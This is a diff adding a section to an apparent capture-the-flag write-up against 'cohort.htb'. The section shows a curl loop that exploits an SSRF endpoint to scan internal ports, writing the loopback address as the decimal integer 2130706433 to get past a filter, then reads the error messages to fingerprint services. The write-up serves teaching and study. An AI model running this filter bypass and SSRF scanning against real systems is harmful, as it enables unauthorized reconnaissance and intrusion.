@@ -1559,6 +1559,117 @@ Port 8888 was probed on inference from the application's own copy and convention
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 3.7 Sweep internal ports through the SSRF
+
+**Why this step:**  
+Port 8888 was reached by inference from application copy and conventional port assignments (3.4). With the endpoint scripted (3.6), enumerate a candidate port list systematically to establish the full internal surface rather than relying on inference.
+
+**Command:**
+
+bash
+
+```bash
+for p in 22 80 443 3000 5000 5432 6379 8000 8080 8081 8888 9000 9090 9200 11211 27017; do
+  r=$(curl -sk -X POST https://cohort.htb/api/validate \
+        -H 'Content-Type: application/json' \
+        -d "{\"url\":\"http://2130706433:$p/\",\"format\":\"csv\"}")
+  echo "$p -> $(echo "$r" | head -c 120)"
+done
+```
+
+**Breakdown:**
+
+|Component|Purpose|
+|---|---|
+|`for p in ...`|Iterate the candidate port list. Ports chosen from conventional assignments for application frameworks, databases, and infrastructure services commonly bound to loopback.|
+|`r=$(curl ...)`|Capture the response into a variable rather than printing directly, so it can be labelled with its port.|
+|`"{\"url\":...\"}"`|Double quotes are required for `$p` to expand, so the inner JSON quotes are backslash-escaped. Single quotes would send the literal string `$p`.|
+|`head -c 120`|Truncate to the first 120 characters. Enough to see the outcome and the beginning of any body, without flooding the terminal with full HTML.|
+|Printing all results|No filtering on `ok`. Failure messages are retained deliberately — the manner of failure distinguishes a closed port from a non-HTTP service.|
+
+**Result:**
+
+```
+22 -> {"ok": false, "message": "Could not validate the source."}
+80 -> {"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>
+<html lang=\"en\">
+<head>
+
+443 -> {"ok": true, "fetched_status": 400, "content_type": "text/html", "preview": "<html>
+<head><title>400 The plain HTTP req
+3000 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+5000 -> {"ok": true, "fetched_status": 405, "content_type": "application/json", "preview": "{\"ok\": false, \"message\": \"Metho
+5432 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+6379 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+8000 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+8080 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+8081 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+8888 -> {"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "
+<!DOCTYPE html>
+<html lang=
+9000 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+9090 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+9200 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+11211 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+27017 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
+```
+
+**Analysis:**
+
+Internal services on `127.0.0.1`:
+
+|Port|Service|Evidence|Analysis|Simple Explanation|
+|---|---|---|---|---|
+|22|SSH|`Could not validate the source.` — no errno, distinct from refused|A service answered but did not speak HTTP. SSH emits its version banner on connect; the HTTP client cannot parse it as a response. Matches the externally visible OpenSSH from 1.3.|Something picked up the phone but spoke the wrong language. That's SSH, and it's the same one visible from outside.|
+|80|nginx|`200`, `text/html`, SPA shell body|The target's own web root, same content served externally. Confirms loopback fetches genuinely reach the local machine.|The normal website, viewed from inside the server rather than outside.|
+|443|nginx (TLS)|`400`, body `400 The plain HTTP request was sent to HTTPS port`|nginx's TLS listener rejecting a cleartext request. The SSRF client issues `http://`, so TLS ports return this error rather than content.|The secure version of the same website complaining you knocked without encryption.|
+|5000|JSON API|`405`, `application/json`, body `{"ok": false, "message": "Metho...`|**Not externally exposed.** A JSON API rejecting GET with Method Not Allowed. The `ok` / `message` envelope matches `/api/validate`, suggesting shared code or authorship.|A hidden data service that only accepts certain kinds of request. Invisible from outside.|
+|8888|Marimo|`200`, `text/html; charset=utf-8`, Marimo login page|**Not externally exposed.** Notebook server with token authentication, identified in 3.4.|A hidden notebook application with a login screen. Invisible from outside.|
+
+Ports returning `Connection refused`: 3000, 5432, 6379, 8000, 8080, 8081, 9000, 9090, 9200, 11211, 27017. No service is bound on any of these.
+
+###### Theory — reading failure messages as enumeration data:
+
+The application returns three distinguishable outcomes, and each carries different information:
+
+|Outcome|Message|Meaning|
+|---|---|---|
+|Filter rejection|`Internal or loopback addresses are not permitted.`|The blocklist matched. No connection attempted. Observed in 3.2.|
+|Connection refused|`Could not reach the source: [Errno 111] Connection refused`|The TCP connection was actively rejected by the kernel. **Nothing is listening on that port.**|
+|Protocol mismatch|`Could not validate the source.`|A TCP connection succeeded, but the response was not parseable as HTTP. **Something is listening, but it does not speak HTTP.**|
+|Success|`ok: true` with `fetched_status`|An HTTP service responded.|
+
+The distinction between the second and third is the useful one. Errno 111 is a definitive negative: the kernel sent a RST because no socket was bound. The absence of an errno, paired with a generic validation failure, means the connection was established and data was exchanged — the client simply could not interpret it. Port 22 falls in this category because SSH greets every connection with a plaintext version banner, which an HTTP parser rejects.
+
+This turns an HTTP-only SSRF into a general TCP port scanner. Non-HTTP services cannot have their content read, but their **presence** is detectable purely from how the fetch fails. Detailed error messages returned to the user are a minor information disclosure in their own right; here they upgrade the SSRF's capability considerably.
+
+Note also that HTTPS ports return `400` with an nginx error rather than content, because the SSRF client issues cleartext HTTP. Reaching a TLS-wrapped internal service would require the client to accept an `https://` scheme.
+
+**What this gives you:**
+
+**Key findings:**
+
+- **Two services are bound to loopback and were invisible to every external scan:** a JSON API on port 5000 and the Marimo notebook server on port 8888.
+- **The JSON API on port 5000 returns `405 Method Not Allowed` to a GET**, with an `{"ok": ..., "message": ...}` envelope identical in structure to `/api/validate`. Shared codebase or authorship is likely, though unconfirmed.
+- **Error messages discriminate between closed ports and non-HTTP services.** Errno 111 confirms nothing is listening; a bare validation failure confirms something is listening that does not speak HTTP. Port 22 is detected this way despite the client being unable to read it.
+- **No database or cache services are bound to loopback.** PostgreSQL, Redis, MySQL, MongoDB, Elasticsearch, and Memcached ports all return connection refused, ruling out direct data-store access via SSRF.
+- The internal and external views of ports 80 and 443 match, confirming a single nginx instance rather than separate internal and external servers.
+
+**Ruled out:** Ports 3000, 5432, 6379, 8000, 8080, 8081, 9000, 9090, 9200, 11211, 27017 — no listeners.
+
+**Instance note:** This sweep covers a conventional candidate list, not the full 65535-port range. A service on an unconventional port would be missed. The list can be extended, at one request per port.
+
+**Next:**  
+Marimo on port 8888 presents the most direct attack surface: a notebook server with a substantial vulnerability history, whose exposure depends entirely on version. Query its version endpoint before assessing further.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
